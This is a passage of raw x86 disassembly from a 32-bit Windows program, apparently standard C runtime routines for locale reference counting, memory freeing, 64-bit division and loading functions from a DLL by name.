  407eba:	8b 3d 44 b1 40 00    	mov    0x40b144,%edi
  407ec0:	ff d7                	call   *%edi
  407ec2:	f6 46 70 02          	testb  $0x2,0x70(%esi)
  407ec6:	0f 85 ea 00 00 00    	jne    0x407fb6
  407ecc:	f6 05 90 fb 40 00 01 	testb  $0x1,0x40fb90
  407ed3:	0f 85 dd 00 00 00    	jne    0x407fb6
  407ed9:	6a 0d                	push   $0xd
  407edb:	e8 0b ee ff ff       	call   0x406ceb
  407ee0:	59                   	pop    %ecx
  407ee1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407ee5:	8b 43 04             	mov    0x4(%ebx),%eax
  407ee8:	a3 bc 15 41 00       	mov    %eax,0x4115bc
  407eed:	8b 43 08             	mov    0x8(%ebx),%eax
  407ef0:	a3 c0 15 41 00       	mov    %eax,0x4115c0
  407ef5:	8b 43 0c             	mov    0xc(%ebx),%eax
  407ef8:	a3 c4 15 41 00       	mov    %eax,0x4115c4
  407efd:	33 c0                	xor    %eax,%eax
  407eff:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407f02:	83 f8 05             	cmp    $0x5,%eax
  407f05:	7d 10                	jge    0x407f17
  407f07:	66 8b 4c 43 10       	mov    0x10(%ebx,%eax,2),%cx
  407f0c:	66 89 0c 45 b0 15 41 	mov    %cx,0x4115b0(,%eax,2)
  407f13:	00 
  407f14:	40                   	inc    %eax
  407f15:	eb e8                	jmp    0x407eff
  407f17:	33 c0                	xor    %eax,%eax
  407f19:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407f1c:	3d 01 01 00 00       	cmp    $0x101,%eax
  407f21:	7d 0d                	jge    0x407f30
  407f23:	8a 4c 18 1c          	mov    0x1c(%eax,%ebx,1),%cl
  407f27:	88 88 90 f8 40 00    	mov    %cl,0x40f890(%eax)
  407f2d:	40                   	inc    %eax
  407f2e:	eb e9                	jmp    0x407f19
  407f30:	33 c0                	xor    %eax,%eax
  407f32:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407f35:	3d 00 01 00 00       	cmp    $0x100,%eax
  407f3a:	7d 10                	jge    0x407f4c
  407f3c:	8a 8c 18 1d 01 00 00 	mov    0x11d(%eax,%ebx,1),%cl
  407f43:	88 88 98 f9 40 00    	mov    %cl,0x40f998(%eax)
  407f49:	40                   	inc    %eax
  407f4a:	eb e6                	jmp    0x407f32
  407f4c:	ff 35 98 fa 40 00    	push   0x40fa98
  407f52:	ff 15 50 b1 40 00    	call   *0x40b150
  407f58:	85 c0                	test   %eax,%eax
  407f5a:	75 13                	jne    0x407f6f
  407f5c:	a1 98 fa 40 00       	mov    0x40fa98,%eax
  407f61:	3d 70 f6 40 00       	cmp    $0x40f670,%eax
  407f66:	74 07                	je     0x407f6f
  407f68:	50                   	push   %eax
  407f69:	e8 3d bc ff ff       	call   0x403bab
  407f6e:	59                   	pop    %ecx
  407f6f:	89 1d 98 fa 40 00    	mov    %ebx,0x40fa98
  407f75:	53                   	push   %ebx
  407f76:	ff d7                	call   *%edi
  407f78:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407f7f:	e8 02 00 00 00       	call   0x407f86
  407f84:	eb 30                	jmp    0x407fb6
  407f86:	6a 0d                	push   $0xd
  407f88:	e8 85 ec ff ff       	call   0x406c12
  407f8d:	59                   	pop    %ecx
  407f8e:	c3                   	ret
  407f8f:	eb 25                	jmp    0x407fb6
  407f91:	83 f8 ff             	cmp    $0xffffffff,%eax
  407f94:	75 20                	jne    0x407fb6
  407f96:	81 fb 70 f6 40 00    	cmp    $0x40f670,%ebx
  407f9c:	74 07                	je     0x407fa5
  407f9e:	53                   	push   %ebx
  407f9f:	e8 07 bc ff ff       	call   0x403bab
  407fa4:	59                   	pop    %ecx
  407fa5:	e8 03 c3 ff ff       	call   0x4042ad
  407faa:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  407fb0:	eb 04                	jmp    0x407fb6
  407fb2:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  407fb6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407fb9:	e8 57 cb ff ff       	call   0x404b15
  407fbe:	c3                   	ret
  407fbf:	83 3d 50 27 41 00 00 	cmpl   $0x0,0x412750
  407fc6:	75 12                	jne    0x407fda
  407fc8:	6a fd                	push   $0xfffffffd
  407fca:	e8 56 fe ff ff       	call   0x407e25
  407fcf:	59                   	pop    %ecx
  407fd0:	c7 05 50 27 41 00 01 	movl   $0x1,0x412750
  407fd7:	00 00 00 
  407fda:	33 c0                	xor    %eax,%eax
  407fdc:	c3                   	ret
  407fdd:	8b ff                	mov    %edi,%edi
  407fdf:	55                   	push   %ebp
  407fe0:	8b ec                	mov    %esp,%ebp
  407fe2:	53                   	push   %ebx
  407fe3:	56                   	push   %esi
  407fe4:	8b 35 44 b1 40 00    	mov    0x40b144,%esi
  407fea:	57                   	push   %edi
  407feb:	8b 7d 08             	mov    0x8(%ebp),%edi
  407fee:	57                   	push   %edi
  407fef:	ff d6                	call   *%esi
  407ff1:	8b 87 b0 00 00 00    	mov    0xb0(%edi),%eax
  407ff7:	85 c0                	test   %eax,%eax
  407ff9:	74 03                	je     0x407ffe
  407ffb:	50                   	push   %eax
  407ffc:	ff d6                	call   *%esi
  407ffe:	8b 87 b8 00 00 00    	mov    0xb8(%edi),%eax
  408004:	85 c0                	test   %eax,%eax
  408006:	74 03                	je     0x40800b
  408008:	50                   	push   %eax
  408009:	ff d6                	call   *%esi
  40800b:	8b 87 b4 00 00 00    	mov    0xb4(%edi),%eax
  408011:	85 c0                	test   %eax,%eax
  408013:	74 03                	je     0x408018
  408015:	50                   	push   %eax
  408016:	ff d6                	call   *%esi
  408018:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  40801e:	85 c0                	test   %eax,%eax
  408020:	74 03                	je     0x408025
  408022:	50                   	push   %eax
  408023:	ff d6                	call   *%esi
  408025:	8d 5f 50             	lea    0x50(%edi),%ebx
  408028:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  40802f:	81 7b f8 94 fb 40 00 	cmpl   $0x40fb94,-0x8(%ebx)
  408036:	74 09                	je     0x408041
  408038:	8b 03                	mov    (%ebx),%eax
  40803a:	85 c0                	test   %eax,%eax
  40803c:	74 03                	je     0x408041
  40803e:	50                   	push   %eax
  40803f:	ff d6                	call   *%esi
  408041:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  408045:	74 0a                	je     0x408051
  408047:	8b 43 04             	mov    0x4(%ebx),%eax
  40804a:	85 c0                	test   %eax,%eax
  40804c:	74 03                	je     0x408051
  40804e:	50                   	push   %eax
  40804f:	ff d6                	call   *%esi
  408051:	83 c3 10             	add    $0x10,%ebx
  408054:	ff 4d 08             	decl   0x8(%ebp)
  408057:	75 d6                	jne    0x40802f
  408059:	8b 87 d4 00 00 00    	mov    0xd4(%edi),%eax
  40805f:	05 b4 00 00 00       	add    $0xb4,%eax
  408064:	50                   	push   %eax
  408065:	ff d6                	call   *%esi
  408067:	5f                   	pop    %edi
  408068:	5e                   	pop    %esi
  408069:	5b                   	pop    %ebx
  40806a:	5d                   	pop    %ebp
  40806b:	c3                   	ret
  40806c:	8b ff                	mov    %edi,%edi
  40806e:	55                   	push   %ebp
  40806f:	8b ec                	mov    %esp,%ebp
  408071:	57                   	push   %edi
  408072:	8b 7d 08             	mov    0x8(%ebp),%edi
  408075:	85 ff                	test   %edi,%edi
  408077:	0f 84 83 00 00 00    	je     0x408100
  40807d:	53                   	push   %ebx
  40807e:	56                   	push   %esi
  40807f:	8b 35 50 b1 40 00    	mov    0x40b150,%esi
  408085:	57                   	push   %edi
  408086:	ff d6                	call   *%esi
  408088:	8b 87 b0 00 00 00    	mov    0xb0(%edi),%eax
  40808e:	85 c0                	test   %eax,%eax
  408090:	74 03                	je     0x408095
  408092:	50                   	push   %eax
  408093:	ff d6                	call   *%esi
  408095:	8b 87 b8 00 00 00    	mov    0xb8(%edi),%eax
  40809b:	85 c0                	test   %eax,%eax
  40809d:	74 03                	je     0x4080a2
  40809f:	50                   	push   %eax
  4080a0:	ff d6                	call   *%esi
  4080a2:	8b 87 b4 00 00 00    	mov    0xb4(%edi),%eax
  4080a8:	85 c0                	test   %eax,%eax
  4080aa:	74 03                	je     0x4080af
  4080ac:	50                   	push   %eax
  4080ad:	ff d6                	call   *%esi
  4080af:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  4080b5:	85 c0                	test   %eax,%eax
  4080b7:	74 03                	je     0x4080bc
  4080b9:	50                   	push   %eax
  4080ba:	ff d6                	call   *%esi
  4080bc:	8d 5f 50             	lea    0x50(%edi),%ebx
  4080bf:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  4080c6:	81 7b f8 94 fb 40 00 	cmpl   $0x40fb94,-0x8(%ebx)
  4080cd:	74 09                	je     0x4080d8
  4080cf:	8b 03                	mov    (%ebx),%eax
  4080d1:	85 c0                	test   %eax,%eax
  4080d3:	74 03                	je     0x4080d8
  4080d5:	50                   	push   %eax
  4080d6:	ff d6                	call   *%esi
  4080d8:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  4080dc:	74 0a                	je     0x4080e8
  4080de:	8b 43 04             	mov    0x4(%ebx),%eax
  4080e1:	85 c0                	test   %eax,%eax
  4080e3:	74 03                	je     0x4080e8
  4080e5:	50                   	push   %eax
  4080e6:	ff d6                	call   *%esi
  4080e8:	83 c3 10             	add    $0x10,%ebx
  4080eb:	ff 4d 08             	decl   0x8(%ebp)
  4080ee:	75 d6                	jne    0x4080c6
  4080f0:	8b 87 d4 00 00 00    	mov    0xd4(%edi),%eax
  4080f6:	05 b4 00 00 00       	add    $0xb4,%eax
  4080fb:	50                   	push   %eax
  4080fc:	ff d6                	call   *%esi
  4080fe:	5e                   	pop    %esi
  4080ff:	5b                   	pop    %ebx
  408100:	8b c7                	mov    %edi,%eax
  408102:	5f                   	pop    %edi
  408103:	5d                   	pop    %ebp
  408104:	c3                   	ret
  408105:	8b ff                	mov    %edi,%edi
  408107:	55                   	push   %ebp
  408108:	8b ec                	mov    %esp,%ebp
  40810a:	53                   	push   %ebx
  40810b:	56                   	push   %esi
  40810c:	8b 75 08             	mov    0x8(%ebp),%esi
  40810f:	8b 86 bc 00 00 00    	mov    0xbc(%esi),%eax
  408115:	33 db                	xor    %ebx,%ebx
  408117:	57                   	push   %edi
  408118:	3b c3                	cmp    %ebx,%eax
  40811a:	74 6f                	je     0x40818b
  40811c:	3d f8 fe 40 00       	cmp    $0x40fef8,%eax
  408121:	74 68                	je     0x40818b
  408123:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  408129:	3b c3                	cmp    %ebx,%eax
  40812b:	74 5e                	je     0x40818b
  40812d:	39 18                	cmp    %ebx,(%eax)
  40812f:	75 5a                	jne    0x40818b
  408131:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  408137:	3b c3                	cmp    %ebx,%eax
  408139:	74 17                	je     0x408152
  40813b:	39 18                	cmp    %ebx,(%eax)
  40813d:	75 13                	jne    0x408152
  40813f:	50                   	push   %eax
  408140:	e8 66 ba ff ff       	call   0x403bab
  408145:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  40814b:	e8 96 0d 00 00       	call   0x408ee6
  408150:	59                   	pop    %ecx
  408151:	59                   	pop    %ecx
  408152:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  408158:	3b c3                	cmp    %ebx,%eax
  40815a:	74 17                	je     0x408173
  40815c:	39 18                	cmp    %ebx,(%eax)
  40815e:	75 13                	jne    0x408173
  408160:	50                   	push   %eax
  408161:	e8 45 ba ff ff       	call   0x403bab
  408166:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  40816c:	e8 0c 0d 00 00       	call   0x408e7d
  408171:	59                   	pop    %ecx
  408172:	59                   	pop    %ecx
  408173:	ff b6 b0 00 00 00    	push   0xb0(%esi)
  408179:	e8 2d ba ff ff       	call   0x403bab
  40817e:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  408184:	e8 22 ba ff ff       	call   0x403bab
  408189:	59                   	pop    %ecx
  40818a:	59                   	pop    %ecx
  40818b:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  408191:	3b c3                	cmp    %ebx,%eax
  408193:	74 44                	je     0x4081d9
  408195:	39 18                	cmp    %ebx,(%eax)
  408197:	75 40                	jne    0x4081d9
  408199:	8b 86 c4 00 00 00    	mov    0xc4(%esi),%eax
  40819f:	2d fe 00 00 00       	sub    $0xfe,%eax
  4081a4:	50                   	push   %eax
  4081a5:	e8 01 ba ff ff       	call   0x403bab
  4081aa:	8b 86 cc 00 00 00    	mov    0xcc(%esi),%eax
  4081b0:	bf 80 00 00 00       	mov    $0x80,%edi
  4081b5:	2b c7                	sub    %edi,%eax
  4081b7:	50                   	push   %eax
  4081b8:	e8 ee b9 ff ff       	call   0x403bab
  4081bd:	8b 86 d0 00 00 00    	mov    0xd0(%esi),%eax
  4081c3:	2b c7                	sub    %edi,%eax
  4081c5:	50                   	push   %eax
  4081c6:	e8 e0 b9 ff ff       	call   0x403bab
  4081cb:	ff b6 c0 00 00 00    	push   0xc0(%esi)
  4081d1:	e8 d5 b9 ff ff       	call   0x403bab
  4081d6:	83 c4 10             	add    $0x10,%esp
  4081d9:	8b 86 d4 00 00 00    	mov    0xd4(%esi),%eax
  4081df:	3d 98 fb 40 00       	cmp    $0x40fb98,%eax
  4081e4:	74 1b                	je     0x408201
  4081e6:	39 98 b4 00 00 00    	cmp    %ebx,0xb4(%eax)
  4081ec:	75 13                	jne    0x408201
  4081ee:	50                   	push   %eax
  4081ef:	e8 12 09 00 00       	call   0x408b06
  4081f4:	ff b6 d4 00 00 00    	push   0xd4(%esi)
  4081fa:	e8 ac b9 ff ff       	call   0x403bab
  4081ff:	59                   	pop    %ecx
  408200:	59                   	pop    %ecx
  408201:	8d 7e 50             	lea    0x50(%esi),%edi
  408204:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  40820b:	81 7f f8 94 fb 40 00 	cmpl   $0x40fb94,-0x8(%edi)
  408212:	74 11                	je     0x408225
  408214:	8b 07                	mov    (%edi),%eax
  408216:	3b c3                	cmp    %ebx,%eax
  408218:	74 0b                	je     0x408225
  40821a:	39 18                	cmp    %ebx,(%eax)
  40821c:	75 07                	jne    0x408225
  40821e:	50                   	push   %eax
  40821f:	e8 87 b9 ff ff       	call   0x403bab
  408224:	59                   	pop    %ecx
  408225:	39 5f fc             	cmp    %ebx,-0x4(%edi)
  408228:	74 12                	je     0x40823c
  40822a:	8b 47 04             	mov    0x4(%edi),%eax
  40822d:	3b c3                	cmp    %ebx,%eax
  40822f:	74 0b                	je     0x40823c
  408231:	39 18                	cmp    %ebx,(%eax)
  408233:	75 07                	jne    0x40823c
  408235:	50                   	push   %eax
  408236:	e8 70 b9 ff ff       	call   0x403bab
  40823b:	59                   	pop    %ecx
  40823c:	83 c7 10             	add    $0x10,%edi
  40823f:	ff 4d 08             	decl   0x8(%ebp)
  408242:	75 c7                	jne    0x40820b
  408244:	56                   	push   %esi
  408245:	e8 61 b9 ff ff       	call   0x403bab
  40824a:	59                   	pop    %ecx
  40824b:	5f                   	pop    %edi
  40824c:	5e                   	pop    %esi
  40824d:	5b                   	pop    %ebx
  40824e:	5d                   	pop    %ebp
  40824f:	c3                   	ret
  408250:	8b ff                	mov    %edi,%edi
  408252:	55                   	push   %ebp
  408253:	8b ec                	mov    %esp,%ebp
  408255:	57                   	push   %edi
  408256:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408259:	85 ff                	test   %edi,%edi
  40825b:	74 3b                	je     0x408298
  40825d:	8b 45 08             	mov    0x8(%ebp),%eax
  408260:	85 c0                	test   %eax,%eax
  408262:	74 34                	je     0x408298
  408264:	56                   	push   %esi
  408265:	8b 30                	mov    (%eax),%esi
  408267:	3b f7                	cmp    %edi,%esi
  408269:	74 28                	je     0x408293
  40826b:	57                   	push   %edi
  40826c:	89 38                	mov    %edi,(%eax)
  40826e:	e8 6a fd ff ff       	call   0x407fdd
  408273:	59                   	pop    %ecx
  408274:	85 f6                	test   %esi,%esi
  408276:	74 1b                	je     0x408293
  408278:	56                   	push   %esi
  408279:	e8 ee fd ff ff       	call   0x40806c
  40827e:	83 3e 00             	cmpl   $0x0,(%esi)
  408281:	59                   	pop    %ecx
  408282:	75 0f                	jne    0x408293
  408284:	81 fe 00 fd 40 00    	cmp    $0x40fd00,%esi
  40828a:	74 07                	je     0x408293
  40828c:	56                   	push   %esi
  40828d:	e8 73 fe ff ff       	call   0x408105
  408292:	59                   	pop    %ecx
  408293:	8b c7                	mov    %edi,%eax
  408295:	5e                   	pop    %esi
  408296:	eb 02                	jmp    0x40829a
  408298:	33 c0                	xor    %eax,%eax
  40829a:	5f                   	pop    %edi
  40829b:	5d                   	pop    %ebp
  40829c:	c3                   	ret
  40829d:	6a 0c                	push   $0xc
  40829f:	68 60 da 40 00       	push   $0x40da60
  4082a4:	e8 27 c8 ff ff       	call   0x404ad0
  4082a9:	e8 d7 e3 ff ff       	call   0x406685
  4082ae:	8b f0                	mov    %eax,%esi
  4082b0:	a1 90 fb 40 00       	mov    0x40fb90,%eax
  4082b5:	85 46 70             	test   %eax,0x70(%esi)
  4082b8:	74 22                	je     0x4082dc
  4082ba:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  4082be:	74 1c                	je     0x4082dc
  4082c0:	e8 c0 e3 ff ff       	call   0x406685
  4082c5:	8b 70 6c             	mov    0x6c(%eax),%esi
  4082c8:	85 f6                	test   %esi,%esi
  4082ca:	75 08                	jne    0x4082d4
  4082cc:	6a 20                	push   $0x20
  4082ce:	e8 d1 c7 ff ff       	call   0x404aa4
  4082d3:	59                   	pop    %ecx
  4082d4:	8b c6                	mov    %esi,%eax
  4082d6:	e8 3a c8 ff ff       	call   0x404b15
  4082db:	c3                   	ret
  4082dc:	6a 0c                	push   $0xc
  4082de:	e8 08 ea ff ff       	call   0x406ceb
  4082e3:	59                   	pop    %ecx
  4082e4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4082e8:	ff 35 d8 fd 40 00    	push   0x40fdd8
  4082ee:	83 c6 6c             	add    $0x6c,%esi
  4082f1:	56                   	push   %esi
  4082f2:	e8 59 ff ff ff       	call   0x408250
  4082f7:	59                   	pop    %ecx
  4082f8:	59                   	pop    %ecx
  4082f9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4082fc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408303:	e8 02 00 00 00       	call   0x40830a
  408308:	eb be                	jmp    0x4082c8
  40830a:	6a 0c                	push   $0xc
  40830c:	e8 01 e9 ff ff       	call   0x406c12
  408311:	59                   	pop    %ecx
  408312:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  408315:	c3                   	ret
  408316:	cc                   	int3
  408317:	cc                   	int3
  408318:	cc                   	int3
  408319:	cc                   	int3
  40831a:	cc                   	int3
  40831b:	cc                   	int3
  40831c:	cc                   	int3
  40831d:	cc                   	int3
  40831e:	cc                   	int3
  40831f:	cc                   	int3
  408320:	56                   	push   %esi
  408321:	8b 44 24 14          	mov    0x14(%esp),%eax
  408325:	0b c0                	or     %eax,%eax
  408327:	75 28                	jne    0x408351
  408329:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40832d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408331:	33 d2                	xor    %edx,%edx
  408333:	f7 f1                	div    %ecx
  408335:	8b d8                	mov    %eax,%ebx
  408337:	8b 44 24 08          	mov    0x8(%esp),%eax
  40833b:	f7 f1                	div    %ecx
  40833d:	8b f0                	mov    %eax,%esi
  40833f:	8b c3                	mov    %ebx,%eax
  408341:	f7 64 24 10          	mull   0x10(%esp)
  408345:	8b c8                	mov    %eax,%ecx
  408347:	8b c6                	mov    %esi,%eax
  408349:	f7 64 24 10          	mull   0x10(%esp)
  40834d:	03 d1                	add    %ecx,%edx
  40834f:	eb 47                	jmp    0x408398
  408351:	8b c8                	mov    %eax,%ecx
  408353:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  408357:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40835b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40835f:	d1 e9                	shr    $1,%ecx
  408361:	d1 db                	rcr    $1,%ebx
  408363:	d1 ea                	shr    $1,%edx
  408365:	d1 d8                	rcr    $1,%eax
  408367:	0b c9                	or     %ecx,%ecx
  408369:	75 f4                	jne    0x40835f
  40836b:	f7 f3                	div    %ebx
  40836d:	8b f0                	mov    %eax,%esi
  40836f:	f7 64 24 14          	mull   0x14(%esp)
  408373:	8b c8                	mov    %eax,%ecx
  408375:	8b 44 24 10          	mov    0x10(%esp),%eax
  408379:	f7 e6                	mul    %esi
  40837b:	03 d1                	add    %ecx,%edx
  40837d:	72 0e                	jb     0x40838d
  40837f:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  408383:	77 08                	ja     0x40838d
  408385:	72 0f                	jb     0x408396
  408387:	3b 44 24 08          	cmp    0x8(%esp),%eax
  40838b:	76 09                	jbe    0x408396
  40838d:	4e                   	dec    %esi
  40838e:	2b 44 24 10          	sub    0x10(%esp),%eax
  408392:	1b 54 24 14          	sbb    0x14(%esp),%edx
  408396:	33 db                	xor    %ebx,%ebx
  408398:	2b 44 24 08          	sub    0x8(%esp),%eax
  40839c:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  4083a0:	f7 da                	neg    %edx
  4083a2:	f7 d8                	neg    %eax
  4083a4:	83 da 00             	sbb    $0x0,%edx
  4083a7:	8b ca                	mov    %edx,%ecx
  4083a9:	8b d3                	mov    %ebx,%edx
  4083ab:	8b d9                	mov    %ecx,%ebx
  4083ad:	8b c8                	mov    %eax,%ecx
  4083af:	8b c6                	mov    %esi,%eax
  4083b1:	5e                   	pop    %esi
  4083b2:	c2 10 00             	ret    $0x10
  4083b5:	8b ff                	mov    %edi,%edi
  4083b7:	55                   	push   %ebp
  4083b8:	8b ec                	mov    %esp,%ebp
  4083ba:	83 ec 24             	sub    $0x24,%esp
  4083bd:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4083c2:	33 c5                	xor    %ebp,%eax
  4083c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4083c7:	8b 45 08             	mov    0x8(%ebp),%eax
  4083ca:	53                   	push   %ebx
  4083cb:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4083ce:	8b 45 0c             	mov    0xc(%ebp),%eax
  4083d1:	56                   	push   %esi
  4083d2:	57                   	push   %edi
  4083d3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4083d6:	e8 fa e0 ff ff       	call   0x4064d5
  4083db:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  4083df:	83 3d cc 15 41 00 00 	cmpl   $0x0,0x4115cc
  4083e6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4083e9:	75 7d                	jne    0x408468
  4083eb:	68 f8 c9 40 00       	push   $0x40c9f8
  4083f0:	ff 15 44 b0 40 00    	call   *0x40b044
  4083f6:	8b d8                	mov    %eax,%ebx
  4083f8:	85 db                	test   %ebx,%ebx
  4083fa:	0f 84 10 01 00 00    	je     0x408510
  408400:	8b 3d 48 b0 40 00    	mov    0x40b048,%edi
  408406:	68 ec c9 40 00       	push   $0x40c9ec
  40840b:	53                   	push   %ebx
  40840c:	ff d7                	call   *%edi
  40840e:	85 c0                	test   %eax,%eax
  408410:	0f 84 fa 00 00 00    	je     0x408510
  408416:	8b 35 e4 b0 40 00    	mov    0x40b0e4,%esi
  40841c:	50                   	push   %eax
  40841d:	ff d6                	call   *%esi
  40841f:	68 dc c9 40 00       	push   $0x40c9dc
  408424:	53                   	push   %ebx
  408425:	a3 cc 15 41 00       	mov    %eax,0x4115cc
  40842a:	ff d7                	call   *%edi
  40842c:	50                   	push   %eax
  40842d:	ff d6                	call   *%esi
  40842f:	68 c8 c9 40 00       	push   $0x40c9c8
  408434:	53                   	push   %ebx
  408435:	a3 d0 15 41 00       	mov    %eax,0x4115d0
  40843a:	ff d7                	call   *%edi
  40843c:	50                   	push   %eax
  40843d:	ff d6                	call   *%esi
  40843f:	68 ac c9 40 00       	push   $0x40c9ac
  408444:	53                   	push   %ebx
  408445:	a3 d4 15 41 00       	mov    %eax,0x4115d4
  40844a:	ff d7                	call   *%edi
  40844c:	50                   	push   %eax
  40844d:	ff d6                	call   *%esi
  40844f:	a3 dc 15 41 00       	mov    %eax,0x4115dc
  408454:	85 c0                	test   %eax,%eax
  408456:	74 10                	je     0x408468
  408458:	68 94 c9 40 00       	push   $0x40c994
  40845d:	53                   	push   %ebx
  40845e:	ff d7                	call   *%edi
  408460:	50                   	push   %eax
  408461:	ff d6                	call   *%esi
  408463:	a3 d8 15 41 00       	mov    %eax,0x4115d8
  408468:	a1 d8 15 41 00       	mov    0x4115d8,%eax
  40846d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408470:	8b 35 e8 b0 40 00    	mov    0x40b0e8,%esi
  408476:	3b c1                	cmp    %ecx,%eax
  408478:	74 47                	je     0x4084c1
  40847a:	39 0d dc 15 41 00    	cmp    %ecx,0x4115dc
  408480:	74 3f                	je     0x4084c1
  408482:	50                   	push   %eax
  408483:	ff d6                	call   *%esi
  408485:	ff 35 dc 15 41 00    	push   0x4115dc
  40848b:	8b f8                	mov    %eax,%edi
  40848d:	ff d6                	call   *%esi
  40848f:	8b d8                	mov    %eax,%ebx
  408491:	85 ff                	test   %edi,%edi
  408493:	74 2c                	je     0x4084c1
  408495:	85 db                	test   %ebx,%ebx
  408497:	74 28                	je     0x4084c1
  408499:	ff d7                	call   *%edi
  40849b:	85 c0                	test   %eax,%eax
  40849d:	74 19                	je     0x4084b8
  40849f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4084a2:	51                   	push   %ecx
  4084a3:	6a 0c                	push   $0xc
  4084a5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4084a8:	51                   	push   %ecx
  4084a9:	6a 01                	push   $0x1
  4084ab:	50                   	push   %eax
  4084ac:	ff d3                	call   *%ebx
  4084ae:	85 c0                	test   %eax,%eax
  4084b0:	74 06                	je     0x4084b8
  4084b2:	f6 45 f8 01          	testb  $0x1,-0x8(%ebp)
  4084b6:	75 09                	jne    0x4084c1
  4084b8:	81 4d 10 00 00 20 00 	orl    $0x200000,0x10(%ebp)
  4084bf:	eb 33                	jmp    0x4084f4
  4084c1:	a1 d0 15 41 00       	mov    0x4115d0,%eax
  4084c6:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4084c9:	74 29                	je     0x4084f4
  4084cb:	50                   	push   %eax
  4084cc:	ff d6                	call   *%esi
  4084ce:	85 c0                	test   %eax,%eax
  4084d0:	74 22                	je     0x4084f4
  4084d2:	ff d0                	call   *%eax
  4084d4:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4084d7:	85 c0                	test   %eax,%eax
  4084d9:	74 19                	je     0x4084f4
  4084db:	a1 d4 15 41 00       	mov    0x4115d4,%eax
  4084e0:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4084e3:	74 0f                	je     0x4084f4
  4084e5:	50                   	push   %eax
  4084e6:	ff d6                	call   *%esi
  4084e8:	85 c0                	test   %eax,%eax
  4084ea:	74 08                	je     0x4084f4
  4084ec:	ff 75 ec             	push   -0x14(%ebp)
  4084ef:	ff d0                	call   *%eax
  4084f1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4084f4:	ff 35 cc 15 41 00    	push   0x4115cc
  4084fa:	ff d6                	call   *%esi
  4084fc:	85 c0                	test   %eax,%eax
  4084fe:	74 10                	je     0x408510
  408500:	ff 75 10             	push   0x10(%ebp)
  408503:	ff 75 e4             	push   -0x1c(%ebp)
  408506:	ff 75 e0             	push   -0x20(%ebp)
  408509:	ff 75 ec             	push   -0x14(%ebp)
  40850c:	ff d0                	call   *%eax
  40850e:	eb 02                	jmp    0x408512
  408510:	33 c0                	xor    %eax,%eax
  408512:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408515:	5f                   	pop    %edi
  408516:	5e                   	pop    %esi
  408517:	33 cd                	xor    %ebp,%ecx
  408519:	5b                   	pop    %ebx
  40851a:	e8 5f ab ff ff       	call   0x40307e
  40851f:	c9                   	leave
  408520:	c3                   	ret
  408521:	8b ff                	mov    %edi,%edi
  408523:	55                   	push   %ebp
  408524:	8b ec                	mov    %esp,%ebp
  408526:	56                   	push   %esi
  408527:	8b 75 08             	mov    0x8(%ebp),%esi
  40852a:	57                   	push   %edi
  40852b:	85 f6                	test   %esi,%esi
  40852d:	74 07                	je     0x408536
  40852f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408532:	85 ff                	test   %edi,%edi
  408534:	75 15                	jne    0x40854b
  408536:	e8 72 bd ff ff       	call   0x4042ad
  40853b:	6a 16                	push   $0x16
  40853d:	5e                   	pop    %esi
  40853e:	89 30                	mov    %esi,(%eax)
  408540:	e8 16 bd ff ff       	call   0x40425b
  408545:	8b c6                	mov    %esi,%eax
  408547:	5f                   	pop    %edi
  408548:	5e                   	pop    %esi
  408549:	5d                   	pop    %ebp
  40854a:	c3                   	ret
  40854b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40854e:	85 c9                	test   %ecx,%ecx
  408550:	75 07                	jne    0x408559
  408552:	33 c0                	xor    %eax,%eax
  408554:	66 89 06             	mov    %ax,(%esi)
  408557:	eb dd                	jmp    0x408536
  408559:	8b d6                	mov    %esi,%edx
  40855b:	66 83 3a 00          	cmpw   $0x0,(%edx)
  40855f:	74 06                	je     0x408567
  408561:	83 c2 02             	add    $0x2,%edx
